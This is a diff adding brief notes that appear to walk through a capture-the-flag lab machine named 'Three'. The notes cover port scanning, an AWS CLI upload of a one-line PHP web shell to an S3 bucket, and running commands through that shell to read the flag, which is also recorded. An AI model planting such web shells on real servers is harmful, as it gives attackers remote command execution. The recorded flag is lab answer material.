@@ -1,0 +1,29 @@
+THREE:
+----------------
+
+aws - awscli - reverseshell
+
+1- nmap:
+----------------
+	sudo nmap -p- --open -sS -vvv --min-rate 5000 -vvv -n -Pn 10.129.14.110 	-
+	open ports 22 - 80
+
+2- /etc/hosts:
+----------------
+	add -> 10.129.160.29 s3.thetoppers.htb
+	
+3- aws:
+----------------
+	aws configure
+		keys - temp
+
+4- reverse shell:
+----------------
+	a. php (shell.txt) -> <?php system($_GET["cmd"]); ?>
+	b. aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3:/thetoppers.htb
+
+5- endpoint:
+----------------
+	http://10.129.160.29/shell.php?cmd=cat+../flag.txt
+	flag.txt -> a980d99281a28d638ac68b9bf9453c2b 
+	
